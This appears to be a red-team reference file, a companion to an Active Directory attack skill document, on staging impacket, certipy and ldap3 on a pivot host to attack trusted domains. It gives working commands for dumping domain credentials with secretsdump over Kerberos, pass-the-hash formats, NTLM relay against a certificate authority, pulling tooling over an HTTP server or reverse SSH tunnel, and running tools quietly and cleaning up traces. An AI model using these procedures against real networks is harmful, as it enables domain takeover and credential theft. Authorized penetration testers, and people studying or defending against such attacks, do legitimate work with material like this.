# Shipping a working impacket/python stack to a pivot host

Companion to `multi-domain-ad-attacks/SKILL.md`. The gap this closes: you have
DA-equivalent in domain A, a trust to B, and no Python worth using on the
pivot. Every tool you need (impacket, ldap3, pypsrp, certipy) must run *from
the pivot* because the DCs are not routable from your box.

## 1. Pick the right interpreter on the pivot

Never assume `python3` = the python with your deps:

```bash
for p in python3 python3.11 python3.9 /usr/bin/python3 /opt/*/bin/python3; do
  [ -x "$p" ] || continue
  echo "== $p ($($p -V 2>&1))"
  $p - <<'PY'
for m in ("impacket","ldap3","pypsrp","cryptography","requests"):
    try:
        __import__(m); print("   ok", m)
    except Exception as e:
        print("   --", m, type(e).__name__)
PY
done
```

Why it matters: a `python3.9` venv that has impacket and a `python3.11` that
does not look identical in `command -v python3`, and the failure is an
ImportError at the worst moment (mid-DCSync).

If nothing has impacket, **do not pip install on the pivot** (no network, PEP
668, and it writes to disk). Ship a self-contained venv instead:

```bash
# on your box, same arch + python minor version as the pivot
python3 -m venv /tmp/pt && /tmp/pt/bin/pip -q install impacket ldap3 pypsrp certipy-ad
tar czf pt.tar.gz -C /tmp pt
# pivot
scp pt.tar.gz user@pivot:/tmp/ && ssh user@pivot 'cd /tmp && tar xzf pt.tar.gz'
ssh user@pivot '/tmp/pt/bin/python -c "import impacket;print(impacket.__version__)"'
```

A venv is relocatable only if the **path is identical** on both sides —
build it under `/tmp/pt` and unpack it under `/tmp/pt`. Otherwise use
`--copies` and a `pyvenv.cfg` path fix, or just ship individual `.whl` files
and `pip install --no-index --find-links` on the pivot into a fresh venv.

## 2. Transport: one binary, no dependencies

For the common "pivot has curl but no scp/sftp" case:

```bash
# serve locally
python3 -m http.server 8080 --directory /tmp/ship
# pull on the pivot
curl -sO http://<you>:8080/pt.tar.gz
```

If outbound from the pivot is filtered to 443 only, run the server on 443 or
tunnel: `ssh -R 8080:127.0.0.1:8080 user@pivot` and pull from
`http://127.0.0.1:8080`.

## 3. NTLM dependency trap

impacket's NTLM auth needs `pycryptodomex` (module `Cryptodome`), and the
Debian/Ubuntu python3-impacket package sometimes binds it to the system python
only. Symptom: `ModuleNotFoundError: No module named 'Cryptodome'` after a
successful import of `impacket`. Check both:

```bash
/tmp/pt/bin/python -c "import impacket, Cryptodome; print('ok')"
```

Also check the **hash format**: NTLM pass-the-hash wants the raw 32-hex NT hash,
`LMHASH:NTHASH` with `LMHASH` empty (`aad3b435b51404eeaad3b435b51404ee` works
as the placeholder). Passing the full `user:rid:lm:nt:::` line from secretsdump
directly to `-hashes` fails with "invalid hash" and looks like bad creds.

## 4. Silent-exit trap (the one that wastes an hour)

Over `ssh host 'cmd'` (non-tty) the process can die with **exit 0 and no
output**: stdout buffered, then the SSH channel closes before flush. Three
fixes, use at least one:

```bash
ssh pivot 'PYTHONUNBUFFERED=1 /tmp/pt/bin/python -u /tmp/x.py 2>&1 | tee /tmp/x.log'
ssh pivot '/tmp/pt/bin/python /tmp/x.py > /tmp/x.log 2>&1; echo "rc=$?" >> /tmp/x.log'
ssh -tt pivot '/tmp/pt/bin/python /tmp/x.py'      # allocate a tty (interactive tools need it)
```

Rule: **any run longer than a minute writes to a file and appends `rc=$?`**.
Pull the file, don't trust the SSH exit code — impacket's example scripts call
`sys.exit()` with their own codes and `ssh` forwards them inconsistently.

## 5. Non-tty / interactive gotchas

| Tool | Symptom without a tty | Fix |
|---|---|---|
| `impacket-smbserver` | hangs waiting on stdin | `</dev/null` and background it; or use `-smb2support` with `nohup` |
| `impacket-secretsdump` + `-use-vss` | "VSS failed" and silent fallback to DRSUAPI | add `-debug`; the fallback is fine but slower |
| `certipy` relay | needs a listener + a coerce; without a tty it exits before the relay completes | `certipy relay -target http://ca/certsrv/certfnsh.asp` in `tmux`, then trigger |
| `evil-winrm` / `wmiexec` | colour/CRLF mangling in a pipe | `ssh -tt`, or use `wmiexec.py -nooutput` and read the output file |
| Anything reading a password prompt | `getpass` fails with "EOFError" | pass `-p` / `-hashes`; never rely on the prompt in a pipeline |

## 6. Kerberos from the pivot (`-k` workflows)

```bash
export KRB5CCNAME=FILE:/tmp/eng.ccache
# impacket with a ccache: -k -no-pass, and NEVER -dc-ip if DNS works
/tmp/pt/bin/python impacket-secretsdump.py -k -no-pass dc01.b.local
# if DNS is broken, add the DC to /etc/hosts — -dc-ip with -k breaks the SPN
grep -q dc01.b.local /etc/hosts || echo "10.20.20.10 dc01.b.local dc01" >> /etc/hosts
```

Clock first (`kerberos-trust-abuse/references/smb2time.py`), because every
Kerberos failure from a pivot looks like a credential problem until you check
the skew.

## 7. Cleanup checklist (leave the pivot as you found it)

- Remove `/tmp/pt`, `/tmp/ship`, uploaded scripts, and any `/etc/hosts` line.
- `kdestroy` and unlink ccaches (they are readable by other local users).
- Kill your listeners (`smbserver`, `socat`, forwards) — a forgotten listener
  on 445 is the single most common post-engagement detection finding.
- Note the cleanup in `STATE.md` with a timestamp, so a later session does not
  "helpfully" re-install the stack.
